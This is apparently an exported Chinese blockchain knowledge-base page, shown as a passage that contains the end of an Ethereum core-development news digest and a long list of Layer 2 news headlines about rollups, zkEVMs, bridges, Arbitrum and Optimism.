漏洞\n\n\nEtherscan（测试版） 显示 每个区块的 MEV 信息：包括 proposer fee recipient 和 MEV reward，\n\n\n整个信标链历史的ERA 文件（区块和共识数据的平面存储格式）\n\n\n提款对构建层的影响：中继和构建者只需要运行正确的客户端版本\n\n\n统一的EOF 规范\n\n\nEOF 的好处：节省gas、提高了安全性、更简单和更容易调试\n\n\nEIP4844 实施者视频会议和笔记\n\n\nSELFDESTRUCT删除分析\n\n\nReth（用 Rust 写的 EL 客户端）：开源，预计第一季度支持完全同步\n\n\nEndpoint提案，以便DVT 验证器客户端可以支持委员会聚合\n\n\nVerkle 树PoS 测试网（Beverly Hills)）\n\n\nProtolambda 的PoS 规范发布和测试网历史\n\n\n用 Geth + Prysm运行 EIP4844 本地开发网\n\n\nEIP1153 临时存储（ transient storage ）解释\n\n\nLido 计划将 MEV-Boost 中继列表委托给一个委员会\n\n\nReconnaissance：用 Reth 客户端的代理节点\n\n\nVitalik 的 EOF 提案：禁止 EOF 账户代码自省 : 自动将代码转换到最新的 EVM 版本并使添加 EVM 功能更容易\n\n\n\nTX-Fuzz v1.0.0: 创建随机交易，用于破解 ”提款开发测试网 devnet-0\nAfri: 配置一个网络从创世开始使用PoS, 使用了 Geth + Lodestar\nLido: 在测试网上 试验与Obol网络进行分布式验证器技术（DVT）\nGasper（以太坊权益证明协议）的演变\n\nERC4337 更新（使用 alt mempool 的帐户抽象），捆绑参考实现、兼容性测试套件\nRemco：交易内存上限，32MB 3000 万 gas\n\n\n\n核心开发者和共识层会议重命名为 core devs call execution (ACDE)和 consensus (ACDC)\n\n\nEOF v2 提案，包括 Vitalik 关于禁止代码自省的想法\n\n\nMevboost.pics 随着时间的推移增加区块生成器插槽共享\n\n\nERC4337（账户抽象）去中心化内存池[工作组笔记](github.com/JohnRising/4337-bundler-working-group/blob/main/20230104 Meeting Notes.md)\n\n\nEF Research AMA\n\n各种主题：不仅仅是 4844 的需求，技术解决方案阻止了审查的尝试，以太坊有什么用？就路线图优先级达成共识，为 zkEVM 的最小化 EVM 变化，以太坊应该死板点吗？跨 zkrollups的同步可组合性以及Robust Incentives Group 正在做什么？\n\n\n\nLido benchmarks DVT（DVT 去中心化质押池）\n\n\nFlashbots privacy roast（隐私出块）\n\n\nPrestwich：MEV 的未来 5 年\n\n\nCrazy frontrun：抢跑者（frontrunner）将套利者（exploiter）的 遍布在超 50 个区块 的 4 笔交易进行了复制\n\n\n\n\n独特的熵生成器：猫证明(Proof-of-Cat)和弹珠机（marble run）\n用 Go 实现的 Towers-of-pau\n\n\n\nNimbus 中EIP4844 解耦 gossip（分发网络层） 的设计笔记\n\n\n提案交易 SSZ 重构\n\n\nEOF v2 设计，基于上个月的讨论\n\n\n通过中继从构建器到验证器的MEV-boost 区块流的可视化\nFlashbots：为 MEV-Share 设计，用户将交易发送给 matchmaker，用来匹配为使用其交易而付费的搜索者\n\n\n取款凭证的可视化（0x00 与 0x01）\n\n\nBeverly Hills（Verkle 树）测试网现在是多客户端，Nethermind 与 Geth 同步\n\n\nReth (执行客户端)模块化 p2p 架构可作为独立组件使用\n\n\n执行层客户端多样性：Nethermind 客户端超过 20% 的同步节点\n\n\nEF 账户抽象赞助，高达 30 万美元，截止日期为 3 月 31 日\n\n\nFlashbot：\n\n用多方计算尾随隐私交易，概念证明\n在 Sepolia 测试网上，SGX enclave 内运行的区块生成器\n\n\n\n提议将 blob 从执行负载中解耦\n\n\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/layer2":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/layer2","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/layer2.md","title":"layer2","links":["tags/L222"],"tags":["L222"],"content":"\n\nAZTEC 放出了他们的 zk-zk rollup 的代码，为单条曲线上的 SNARK 实现递归\n\n\n基于账户的匿名 Rollup 的一种规范\n\n\n状态通道如何适应 Layer-2 的后 rollup 时代：即时确定性、不必要使用第三方，可执行任意程序\n\n\nzk-rollups 能帮助区块链做什么？\n\n\n通过开发 Optimistic Rollup 来理解它\n\n\nHermez zk rollup 通过拍卖区块生产者职位来为公共品提供资金\n\n\nCeler 的 State Guardian Network 测试网启动\n\n\nLivepeer 的概率性微支付准 Layer-2 方案\n\n\nENS 尝试用 optimistic rollup 类似方案来解决 DNS 域名声明问题\n\n\nRollup 重放保护\n\n\nUSDT 上线 OMG 二层网络\n\n\nGolem 选择 zk sync 作为扩展方案\n\n\ndYdX 宣布他们与 StarkWare 合作，计划在第四季度实现扩展\n\n\nStarkWare 的 Cairo：通用计算的 STARK 证明器\n\n\nRollup 数据压缩技术\n\n\n使用该压缩技术后，optimistic rollup 实例 Fuel 基准测试测得代币转账的 2500 TPS\n\n\nPOA 迁移到 optimistic rollup VM 方案\n\n\nUSDC 在 Matic 上的运行演示\n\n\nNick Johnson：一种以太坊 layer2 的通用桥\n\n\nArbitrum 导入了 Uniswap 到其 rollup 中。每笔交易只需消耗 2k gas，可以在 Kovan 测试网上尝试使用\n\n\nCeler 的 State Guardian Network 第一阶段启动\n\n\nFuel：让以太坊成为资产创造和结算层\n\n\nLoopring 的 zkrollup 智能合约钱包，安卓 app 已可使用，而且在钱包中持有余额还会获得奖励\n\n\nHermez 的大规模迁移机制，防止 rollup 的中心化\n\n\nLoopring 的 AMM 已登陆他们的 zkrollup（虽然现在仅限于 LRC/ETH）\n\n\nGolem 的最新版本将使用 Zksync 来转账\n\n\nDeversifi 的 validium 已升级到 StarkEx v2，包含了快速取款功能和一种图灵完备的 STARK 证明语言，虽然不标准的 ERC20 token（如 OMG、USDT）还要几个月才能用\n\n\nOptimism 测试网加入欺诈证明，同时为所有发现了他们的欺诈交易的人提供 3.2 ETH 的奖金\n\n\nVitalik 的 rollup 指南 ， 中文翻译版本\n\n\nOptimism 软启动\n\n\nSynthetix：转向 optimistic ethereum 的 5 个阶段\n\n\n你在 Loopring 上可以给任意的以太坊地址转账了（即使对方还没有 zk-rollup 账户）\n\n\nConnext Vector 推出了跨 Layer-2 路由网络\n\n\nLoopring 的 zk-rollup 支持快速取款到主网\n\n\nCeler 在其状态通道游戏中已获得 100 万用户\n\n\n来自 StarkWare 的 DeFi Pooling，放在 layer-2 上的、类似于 yearn 的金库，可帮助用户节省 gas\n\n\nArbitrum 为许多应用放出了测试网\n\n\noptimistic rollups 指南及 Optimism 指南\n\n\nHop 跨 rollup 代币桥\n\n\nCartesi Rollup：使用 TrueBit 类型的 验证/欺诈证明 游戏\n\n\nAztec 和 Starkware 为 rollup 代码发布了 Polaris 证明器许可\n\n\n通往 StarkNet 之路：StarkWare 将在 2021 年末推出的 zk-rollup，使用 Cairo 编写应用\n\n\nCeler 的 cBridge：一种跨 layer-2 的网络，用于在 EVM 链之间实现便宜、即时的价值转移。以准备好生产版本，UI 正在开发中\n\n\nLoopring 的 rollup dex 问世时间不长，但总交易额已突破 5 亿美元，现在每天交易额都有 3000 万美元\n\n\ndYdX 为他们的全仓保证金永续产品推出了 Starkware zkrollup；该产品在主网上还是内测版，预计在几周内公开发布\n\n\nOptimism 计划在三月推出正式版\n\n\nDeversifi 在其 Validium 实现中增加了互换功能\n\n\n高效证明 ORU calldata 的机制\n\n\n一种混合了 optimistic/zkrollup 的路线\n\n\nHermez zk-rollup 以上线 Rinkeby 测试网\n\n\n跨 rollup 的 dex 设计\n\n\n解释 StarkEx 的条件性支付如何实现从 L2 到 L1 的快速取款\n\n\n以实际案例解释 L2 与侧链的区别\n\n\nzkmoney：Aztec 启动 zk-zkrollup，支持隐私交易，当前的单笔交易上限为 1 ETH\n\n\nAztec：使用 TurboPLONK 的 zk-zkrollup 架构\n\n\nArbitrum 的进展\n\n\nHop 跨 EVM 链 AMM 交易所将在 4 月推出，支持 xDai、Polygon 和 Arbitrum\n\n\nOptimism 主网发布推迟到 7 月\n\n\nZk rollup Hermez 已上线 ，支持 ETH、HEZ、WBTC、USDT 和 DAI\n\n\nArbitrum 的进展\n\n\nHop 跨 EVM 链 AMM 交易所将在 4 月推出，支持 xDai、Polygon 和 Arbitrum\n\n\nOptimism 主网发布推迟到 7 月\n\n\nZk rollup Hermez 已上线 ，支持 ETH、HEZ、WBTC、USDT 和 DAI\n\n\n理解 Arbitrum 的设计\n\n\nzkSync 路线图更新\n\n\n给 5 岁小孩解释 Celer’s layer2.finance\n\n\nGodsUnchained 推出了 ImmutableX zkrollup 用于免费的 NFT 转移\n\n\ndydx 现在推出了其 全仓永续保证金合约的 zkrollup（也是运行的 StarkEx）\n\n\nStarkWare 提出的 Caspian l2 AMM：按批撮合交易，净差额上 Layer-1 交易\n\n\nL2beat：跟踪 layer-2 的活动\n\n\nDeversifi 的 layer2 生态系统路线图\n\n\nTruebit 链下计算验证系统宣布上线主网\n\n\nOKEx 将支持存取款到 Arbitrum\n\n\nStarkEx 在 dydx、Deversifi 和 Immutable 上交易量已超过 10 亿美元\n\n\n两个标准化的工作：标准化任意消息桥以及 token 转账标准接口\n\n\nArbitrum 主网计划于 5 月 28 日向开发者推出。最新的测试网引入了一个排序者以实现即时交易\n\n\nLoopring zkrollup 交易量突破 10 亿美元\n\n\nEthhole.link：从以太坊主网到 L2 和侧链的代币流动可视化\n\n\nKris Kaczor 长推特比较 Arbitrum 和 Optimism\n\n\nEtherscan 现已为 Optimism 提供区块浏览器\n\n\n深入解读欺诈证明系统的验证者两难\n\n\nConnext 的虚拟 AMMs 和流动性拍卖，用于跨链互换的负载均衡\n\n\noptimistic rollups 和 zk rollups 差异概说\n\n\nPatrick McCorry：桥决定了什么是 Layer 2\n\n\n经其社区投票，Uniswap V3 登陆 Arbitrum\n\n\n通过 Alchemy 与 Arbitrum 主网交互和部署\n\n\n深入理解 zkSync 2.0 的架构：包括能支持大部分操作码的 zkEVM\n\n\n大白话介绍 rollups\n\n\nRaiden Bespin：稳定版放出，用户需要关闭和清算 Alderan 通道\n\n\nArbRinkeby：稳定的 Arbitrum 测试网\n\n\n10 分钟解释 Arbitrum\n\n\nEY Nightfall 3：带有零知识隐私转账的 optimistic rollup，每笔交易耗费约 8200 gas\n\n\nRollup diff compression：减少 rollup 的主网 gas 用量\n\n\nSynthetix 计划在 7 月 26 号在 Optimism 上开启交易所功能\n\n\nOptimism 停止补贴 L2 gas 费，也不再路由用户的取款交易，Synthetix 为现在的用户给出 WETH，足够发起多笔交易\n\n\nArbitrum 升级：dApp 依赖的一些基础设施项目尚未就绪，单个的 ERC20 桥已在使用\n\n\n用户可能不会再关心 rollup 的浪潮了\n\n\n对比 Optimism 和 Arbitrum 的争议裁决方法\n\n\nOptimism 携 Uniswap V3 上线：alpha 版本，每天有 5 万笔交易的上限，使用拥堵定价算法，可能有 计划内/计划外 的停机，7 天的取款等待期，代币桥支持 DAI、WBTX、USDT、EURT、ETH 和 SNX\n\n\nUniswap 的 Optimism 文档\n\n\nRollup 中的单一许可型定序器\n\n\nStarDrop：以保护隐私的形式在 StarkNet 上分发奖励的实验性项目\n\n\nSynthetix 的 synth 交易所已登陆 Optimism，使用 Kwenta alpha\n\n\nTenderly 添加对 Optimism 的支持\n\n\nSorare 迁移到 Starkware\n\n\nStarkEx v3.0：放在 Layer-1 的金库用于 DeFi 的池子和去中心化的 AMM，为多个独立的 dApp 提供单一的 STARK 证明\n\n\nArbitrum 将在本月内开放给用户\n\n\nNXTP，用于跨链的转账和合约调用，来自 Connext\n\n\nHermez零知识EVM 路线图\n\n\n使用StarkEx担保的无信任L2到侧链桥的建议。\n\n\nArbitrrum门户网站的dapps、钱包和工具将于8月推出\n\n\nOptimism 开发者入门测试，测试网创世可能在 10 月，ETH 可能不再兼容 ERC20，使用 Solidity 编译器，使用 EOA 而非合约钱包，减低 gas 用量\n\n\n1inch Network 已上线 Optimism\n\n\nTeleportr：低成本的主网到 Optimism 的 ETH 桥，限额 0.02 ETH\n\n\nWarp：EVM 到 Cairo（StarkNet 的 智能合约编程语言）转译器\n\n\nStarkWare 的共享证明器降低小 app 的 layer 2 负担\n\n\nOptimism增加了自定义ERC20代币的存款和提款功能\n\n\nNova：在L2和L1之间进行合约调用的无信任中继，部署在Optimism和主网，目前仅限于批准的项目。\n\n\nHop 实现了USDC和USDT从Optimism到主网的快速退出，避免了7天 optimistic rollup 提款时间。\n\n\nLoopring zkRollup NFTs：在L2上铸造、交易和转让，存款到L2，提款到L1， 支持ERC721和ERC1155。\n\n\nL2Beat增加了风险视图：安全、数据可用性、可以更改的内容以及在审查或系统下线时该怎么做。\n\n\nArbitrum\nbeta 版，初始上限为每秒 80k arbgas（等价于主网处理量），代币桥仅限于已得到许可的 token，7 天的退出时间\n\nEther 及代币桥 教程\nArbiscan 区块浏览器\nArbitrum 团队的 Reddit AMA\n精选的 app 已经上线：Uniswap、 Celer 的 cBridge、Balancer、Sushiswap、Dodo、MCDEX、Swapr。更多 app 即将到来\n\n\n\nCeler 的 cBridge 已经为 Optimism 添加支持。3 分钟即可退出。可以在主网、Optimism、Arbitrum 和一些侧链间转账\n\n\nStarkNet Alpha 2：可组合性、本地测试、迁移到 Goerli 测试网；OpenZeppelin 正在开发合约库\n\n\nImmutable X 开放免 gas 费的 NFT 铸造和交易\n\n\nDavid Mihal 的 L2 Fees：比较在不同方案上转移 ETH/token 和币币互换的风险\n\n\nzk Rollups 和数据分片可以实现全球级的扩展，同时保持技术和经济上的可持续\n\n\n为什么 Arbitrum 要使用交互式欺诈证明（中文译本）\n\n\nArbitrum 的免许可代币桥将在 10 月 22 日开放，除非项目自定义，否则 token 会当成一个基本 ERC20 代币来传输\n\n\n呼吁去中心化交易所支持 rollup\n\n\nArbitrum 上运行的项目的完整列表\n\n\nAztec 将其 zkrollup 上的隐私交易额度提高到 30 ETH、100k DAI 和 2 renBTC\n\n\nBitfinex 直接支持到 DeversiFi（基于 StarkWare 的 Layer-2）的桥，从 USDT 开始\n\n\n从 Solidity 到 Cairo 得转译器切换模式，从转译 EVM 操作码换成使用 Solidity 和 Yul 语言的 AST\n\n\nRollup 的抗审查性：Arbitrum 和 Optimism 用户可以强制在 layer-1 上交易，而 StarkWare layer2 使用 app 定制机制\n\n\nOptimism OVM v2.0 将在 10 月 14 日登陆 Kovan 测试网，10 月 28 日登录主网，升级时会有 4~6 小时的停机\n\n\n通用 zkEVM 的设计挑战，解决方案是多项式承诺、查找表、更灵活的递归证明以及硬件加速\n\n\n·Cairo 程序执行的正确性证明\n\n\nStarkNet alpha 计划在 11 月在主网推出：准入型部署，在 alpha 和 beta 版本间没有后向兼容保证\n\n\nEtherscan 推出的 Arbitrum 测试网浏览器\n\n\n有效性证明的成本摊销：zkRollup 交易越多，单交易成本越低\n\n\n无需公开交易历史数据的 zkRollup，可支持隐私合约执行并精简 calldata\n\n\nUniswap v2 fork（Solidity 合约和 dapp）在 zkEVM 测试网上运行的 demo\n\n\nzkSync Reddit AMA\n\n\nArbitrum Nitro 升级预览：运行在 WASM 上，使用 Geth 替换了定制化的 EVM 模拟器，预计有 20 到 50 倍的执行速度提升\n\n\nzkevm-circuits v0.0.1：首次发布，实现了 PUSHX、POP、ADD、SUB、LT、GT 操作码\n\n\nOptimism 的 EVM 等价升级推迟到 11 月 11 日\n\n\nSpringrollup 提议 zkrollup：发送者可以把无限量的转账组合交易包，每个包在链上只需发布 6 字节的 calldata\n\n\n使用 zk rollup 实现具备弱隐私性的AMM\n\n\n对比 Arbitrum 和 Optimism 的错误性证明\n\n\n论文：带验证功能的桥接系统\n\n\nPhonon：第一种硬件实现的隐私链下 memecoin 交易\n\n\n主网上的 StarkNet 证明测试交易\n\n\nArbitrum ERC20 免许可桥接已开放\n\n\nOptimism EVM 等价虚拟机\n\n\nzk rollups 的未来：侧链应采取务实的方法成为 zk-rollup\n\n\nConnext 加入主网支持：可在主网、Arbitrum 和一些侧链之间转移稳定币\n\n\nOptimism 现在不允许部署；未来的更新会继续维护，交易历史和事件数据\n\n\nImmutable X 通过与 MoonPay 整合开通法币通道\n\n\nPolygon Nightfall zk-optimistic rollup 测试网\n\n\nArbitrum 对比 ZK 和 Optimistic Rollups\n\n\nOptimistic Rollups 7天欺诈证明窗口解释\n\n\nCeler 呼吁建立一个开放的规范化 token 桥接标准\n\n\nTransak 法币通道支持 Arbitrum 和 Optimism （目前在美国还不支持）\n\n\nBanxa 法币通道支持 Arbitrum\n\n\nDeversiFi 通过与 MoonPay 整合开通法币通道\n\n\nLoopring Layer2 启动 iOS 钱包，支付后部署到Layer1 以主网撤回和更多功能，通过 Ramp 法币通道\n\n\n跨链协议：现在桥是双向的，增加主网到 Arbitrum，Optimism 和 Boba\n\n\nStarkWare Layer3扩展：应用特定层使用递归证明，StarkEx Layer2 的可以迁移到Layer3\n\n\nHuobi Global 支持在Arbitrum 上进行 ETH 存取款\n\n\nArgent zksync wallet 集成 ZigZag 交易所，统一收取 $1 的交易和网络费\n\n\nL222 是2022年 Layer 2 采用的“官方的”标签🦆\n\n\n来自 ConsenSys Applied R&amp;D 的高效的zk-EVM算法建议\n\n\n12月，在主网上 Layer2 交易消耗掉31.7亿gas\n\n\nFuel v2 Sway 语言，受Rust语言影响，代码库已经公开，可为本地开发使用\n\n\nStarkNet Alpha 交易费方案\n\n\nPolygon Miden VM 将支持无符号32位整型\n\n\n用于StarkNet Warp转译器的IR语义的形式化规范\n\n\nPhonon alpha（点对点隐私传输使用硬件保障安全）：在智能卡上提供并执行一个小程序的工具\n\n\nOptimism交易费降低，平均每笔交易便宜约 30%\n\n\nArbitrum 因 Sequencer 硬件故障停机，而备份恰好在进行软件升级，Arbitrum 仍处于测试阶段，计划在 Sequencer 更加去中心化。\n\n\nBinance 支持 Arbitrum 网络提款。\n\n\nPolygon Zero（以前称为 Mir）Plonky2：基于 PLONK 和 FRI 的递归 SNARK， Macbook Pro 上大约 170 毫秒内可生成递归证明。\n\n\nFuel 提出 Layer 2 代币模型：为Layer 2 区块生产者 将收取费用的权利代币化；建议避免使用PoS、费用支付和治理模型。\n\n\nCeler跨链消息框架上线测试网，单击 UX 发送任意消息并执行指令。\n\n\n采用 Optimism 和 Arbitrum 与侧链的对比曲线图（线性和对数刻度）\n\n\nConnext Vector v0.1.0 live, 用状态通道在 layer2 之间转移价值\n\n\nWarp (Solidity - Cairo 转换器): 第一个主线版本，用 Solidity 编写测试。\n\n\nStarkNet Prover 代码 许可讨论\n\n\nArbitrum 升级 ：更低的交易费\n\n\nBybit and MEXC Global 增加对 Arbitrum 存取的支持\n\n\nArbitrum 抗审查解释器, 在6545个区块和24小时超时后交易可以强制进入主网\n\n\nMoonPay 增加支持用信用卡购买Immutable X ETH\n\n\nPolygon Hermez 文档 ：zkEVM 基于操作码的方法\n\n\nL2Savings: 显示 Layer 2 交易记录，并且对比在主网上交易节省 gas 的情况\n\n\n挑战过程的滑动窗口, 允许显著减少挑战响应时限，并可以在拥塞时延长响应时限\n\n\nSecure Asymmetric Frugal Exchange 原型，用于优化批量跨链交换，从 Layer2 到主网高效转移\n\n\nL2 费: Layer2 为以太坊的安全向 Layer1 支付费用\n\n\nFTX 支持 Arbitrum\n\n\nArgent zkSync 钱包 通过 LayerSwap 从交易所存款\n\n\nProof of Efficiency: 针对 zk-rollups 的 Polygon Hermez 共识提案\n\n\nOKX 和 Bitget 增加 Arbitrum 支持\n\n\nUrbit naive rollup 已上线\n\n\nOptimism 费用解释器, 如何将费用降低30%, 按照1.24的费用标量，每笔交易固定费用2100gas\n\n\nzkSync v2.0 EVM兼容zk-rollup公共测试网\n\n\nOptimism减少时间戳，更新到15秒\n\n\nBarnabé: rollup 经济, 关于费用和经济设计的讨论\n\n\nNorswap的关于optimistic rollups 和 rollups 的看法\n\n\nPolynya的《区块链的状态》: optimistic rollups将发展的更快，但是zk-rollups会赶上它，任何没有效性证明、欺诈证明和数据证明的链都会死。\n\n\nFran (OpenZeppelin拥护者): 关于ERC20 token 在桥接器上可铸造的想法\n\n\n通过批量压缩calldata，Optimism 将费用降低 30-40% ，长期计划与字典一起使用zstd实现尽可能高的压缩比并尽可能低的降低费用\n\n\nPathfinder v0.1.0: Rust 中的 StarkNet 全节点, alpha\n\n\nArbitrum AnyTrust链宣称：超低成本交易，数据哈希上传到主网，委员会运营，假设最少成员诚实，可以回退到标准rollup协议。\n\n\nPolynya: 历史存储——最后的瓶颈，状态增长将通过无状态、有效性证明、状态到期以及PBS来解决\n\n\nArbitrum gas 计价变化，在定价算法中添加一个动量项，gas池充满标准修改为80%，系统反应会更快但更温和。\n\n\nDefersiFi添加到 Arbitrum 的桥\n\n\nArgent zkSync 移动钱包 测试版结束\n\n\nArgent X (StarkNet) v3: 从 v2迁移资产，如briqs\n\n\nStarkNet 账户抽象设计的提案\n\n\nOptimism 提出 Cannon 缺陷证明; Norswap 关于 Cannon 的说明\n\n\nOptimism 多客户端计划 去中心化并去掉升级密钥\n\n\nVitalik 关于 EIP 4488 （降低了calldata的gas开销）和 EIP4844(带有一个新的数据字段的交易类型) 在显著降低rollup交易成本方面的说明\n\n\nStarkNet Alpha v0.8.0 测试网, 增加费用, 可选到 v.0.9.0\n\n\n部分匿名 rollup 设计, 运营商可以拥有完整的数据可用性，账户活动信息会在更新账户状态哈希是泄露，但交易细节对无关方不透明\n\n\noptimistic rollups 的欺诈证明攻击向量: time-travel 攻击和 reality-distortion 攻击; Optimism 的 Cannon 和 Arbitrum 的 Nitro 有望减少攻击面\n\n\nOptimism 压缩调用数据, 下周有望降低 40% 费用\n\n\nHuobi增加在 Optimism 存取以太币\n\n\nRamp 增加在 Arbitrum 购买以太币\n\n\nRaiden 已经实现了 Raiden协议，提供可扩展的支付解决方案\n\n\nAztec (privacy zk rollup) ：降低交易费，证明成本降低了30%(计划降低到 180K gas)， 每笔主网交易汇总 896 Aztec 交易，吞吐量提高了8倍。\n\n\nOptimism 调用数据压缩: 如何解压缩 Layer 2 交易\n\n\n以 Rollup 为中心的未来 而不是跨链，因为桥是单点漏洞并会让目标链陷入传染风险\n\n\nArbitrum Nitro 开发网: 使用核心 Geth 对 WASM 进行欺诈证明，调用数据压缩，代码使用商业源许可证；Twitter 水龙头\n\n\nPolynya: rollup 类型, 常规的（regular）,不可变的（immutable）, 铭记的（enshrined）和自主的（sovereign）\n\n\nKuCoin 支持 Arbitrum 提款\n\n\nWorldcoin 开源协议 ，包括基于 Hubble Project 和 Semaphore 的optimistic rollup\n\n\nKuCoin为Optimism增加存款\n\n\nEIP4844 降低rollup数据可用性成本，但增加了一个新的诚实方假设\n\n\n基于EIP-4844的去中心化zk-rollup设计\n\n\nOptimism Collective：第二季度OP Airdrop #1。网络和公共产品资金采用两院制治理\n\n\nCeler 跨链消息传递框架在主网上线\n\n\nTaiko：去中心化 zk-rollup 设计的初稿\n\n\nKZG 承诺解释器（danksharding 承诺方案），比 Merkle 树更高效，但需要可信设置\n\n\nRaiden 已上线 Arbitrum\n\n\n由数据压缩导致的 Optimistic rollup 价格差异\n\n\nKelvin: hybrid ZK/Optimistic rollup 的未来\n\n\nPolynya: 分离的区块链层\n\n\nKuCoin 支持对 USDC 和 USDT 的Optimism存储服务\n\n\n抗审查桥\n\n\nPolygon Hermez v2 deep dive\n\n\nOptimism Bedrock 源码可用, MIT 许可\n\n\nBinance 支持 Optimism\n\n\nzk-rollup 提议使用实用的可验证延迟加密来最小化 MEV\n\n\nOptimism\n\nHiccups: JSON-RPC 链读取崩溃 但序列完好\n只需要简单的 Docker 设置就可以运行你自己的 Optimism 节点\n\n\n\n为持续发展，ImmutableX 将收取 2% 的费用\n\n\nAztec由于涉及加密交易，Aztec证明超过了300Kb，超过了Geth 128Kb的交易大小限制。Geth是最大的以太坊客户端，这使得发送大型交易变得棘手。\n\n\n关于 L2 交易终结的解释\n\n\nArbitrum 的二维 gas 费: L1 数据调用费 + L2 计算用量\n\n\nOptimism 测试网从 Kovan 迁移到 Goerli\n\n\nAztec Connect (privacy zk rollup) 上线主网；zk.money DeFi 聚合器支持 Element 和 Lido\n\n\nLayer2 桥接风险框架的提案\n\n\n在 Arbitrum Odyssey 桥接期间 Hop 转账延迟 的事后分析\n\n\nArbitrum 的 Nova (用 AnyTrust) 对开发者开放；数据可用性委员会（增加了-假设两个成员是诚实的）\n\n\nStarkNet 代币 宣布用于治理, 费用和质押; 初始 49.9% 分配给投资者和核心贡献者\n\n\nL2Beat添加关于授权地址的信息，帮助用户了解每个汇总所做的临时中心化权衡\n\n\nPolygon zkEVM 开源实现\n\n\nScroll pre-alpha 测试网\n\n\nzkSync v2.0 路线图, 100天内上主网\n\n\nTxStreet 交易可视化工具 添加 Arbitrum, 测试版\n\n\nEIP4844 (proto-danksharding) 视频会议 和 记录\n\n\nBLS 交易类型草案\n\n\nLayer 2 修复， 可变的实际 gas 消耗\n\n\nArbitrum Rinkeby 测试网 升级到 Nitro\n\n\nRainbow 手机钱包 在 Arbitrum 和 Optimism 上添加了 NFT\n\n\n给初学者: Optimism 初学者指南\n\n\nArbitrum One 8月31日升级到 Nitro\n\n\nDelphi Digital: rollup 指南\n\n\nVitalik: zk-EVM 不同类型和其优缺点对比\n\n\nBLS 钱包概述与演示,绑定带有BLS签名的操作，减少数据的链上存储和交易成本\n\n\nArbitrum Nova (用 AnyTrust)对公众开放; 初始数据提供委员会包括 Consensys, FTX, Google Cloud, Offchain Labs, P2P, Quicknode 和 Reddit\n\n\nArbitrum Nitro 白皮书\n\n\n创建缓存合约来降低 Layer 2 成本\n\n\nOptimism Bedrock alpha 测试网\n\n\nPolynya 认为EIP4488（降低 calldata gas 成本）应该是扩展的重点\n\n\nDankrad：在证明中用 KZG 承诺\n\n\nJustin Thaler：SNARK 80 位的安全性太低，应该至少 100 位\n\n\nOptimism Quests：鼓励尝试使用 NFT 的 dapp\n\n\nVitalik：Layer3是有意义的\n\n\nNorswap 对比了 Optimism Bedrock 和 Arbitrum Nitro\n\n\nPolynya: rollup 比 Layer 1 提供更高的吞吐量，因为 rollup 需要的节点更少\n\n\nPolygon zkEVM 公共测试网, 开源 zk 验证系统\n\n\nPolynya: 最小可行的 rollup 去中心化 (Rollup 里程碑的第一阶段: 有限依赖运营商节点 - 辅助轮)\n\n\nArbitrum One现在有 9 个验证者\n\n\n类型理论争议协议提案\n\n\nChristine Kim：zkEVM 概述\n\n\nzkSync v2.0 L1 到 L2和L2 到 L1消息传递\n\n\nTincho：Arbitrum 桥恶意攻击，中继可以无限消耗 gas\n\n由于没有第三方中继的计划，Arbitrum 桥的攻击被认为是不现实的\nScroll：证明生成的计算瓶颈，以及主要的加速方法。\nPolygon zkEVM在每小时7美元的 AWS 实例上证明时间为2.5分钟\nConsensys Vortex zk 证明：在 AWS hpc6a.48xlarge 上 5 分钟内产生 3000 万 gas 的块\nzkSync v2 alpha 延迟到 2023 年第二季度\n\n\n\nPolygon zkEVM 测试网升级 ：使用递归，更快的证明时间和打包聚合\n\n\nIntmax (zk-rollup) testnet, 仅有命令行\n\n\nJustin Drake: SGX作为务实的对冲措施来应对ZK-rollup SNARK漏洞\n\n\nArbitrum:\n\nrollups上应对延迟攻击的方法\n在主网上的批量发布策略\n\n\n\nTaiko: rollup 去中心化, 定义 &amp; 整体思路\n\n\nTaiko zkEVM alpha-1 测试网\n\n\nRock 5B ARM64 板上的 Optimism 节点，概念证明\n\n\nLayer 2（验证交易 + 桥）在主网上的 gas 消耗创纪录的月份\n\n\nzkEVM 的 gas 定价选项\n\n\nL2beat：LayerZero 网桥安全从根本上说是一种可信模型\n\n\nOptimism 的 Bedrock 升级解释\n\n\nKelvin Fichter：为什么在 Optimistic Rollups 中以 7 天为挑战期\n\n\nTicking-Optimism：基于 Optimism Bedrock 的 ticking 链，概念证明\n\n\nOptimism 空投2：OP 代币直接发送给委托人和高级用户\n\n\nArbitrum Stylus公告、Arbitrum One/Nova 的编程环境和 WASM VM，预计 2023 年将允许非 EVM 语言（如 Rust、C、C++）的程序\n\n\nzkEVMs 争先恐后地进入主网：\n\nzkSync Era (zkSync v2) 在 alpha 发布前启动项目\nPolygon zkEVM宣布将于 3 月 27 日发布 Beta 版\n\n\n\nOptimism 推迟了 Bedrock 升级投票以解决赏金竞赛发现的问题\n\n\nCoinbase终于支持了 Arbitrum 网络上进行 ETH 和 DAI 的存取款\n\n\nPatrick McCorry：去中心化 rollup 需要确保当系统受到对手攻击时，一个诚实方可以将所有潜在的决定发送到合约桥\n\n\nEF Layer 2 为 22 个项目提供 94.8 万美元的资助\n\n\nArbitrum One在交易量上领先以太坊主网，Rollup 首次实现一天内超过主网交易量\n\n\nBase：建立在 Optimism 的 OP Stack 上的 Coinbase 第 2 层，在测试网上运行，以 ETH 支付交易费用，其中一部分 sequencer 收入用于资助公共产品\n\n\nOptimism 的超级链概念：具有共享桥和通信层的 OP 链网络\n\n\nPatrick McCorry: rollup 交易最终性 : sequencer 承诺提交, 交易最终排序 及 执行层确认执行\n\n\nScroll zkEVM alpha 测试网\n\n\nArbitrum 提出交易时间加速替代先到先得(FCFS)，MEV 搜索者最多可以为交易购买0.5秒的提升\n\n\nJordi Baylina：证明者不是 zk rollup 可扩展性的瓶颈，因为它们可以并行运行\n\n\nPatrick McCorry：在 rollup 之上的链下系统（Layer 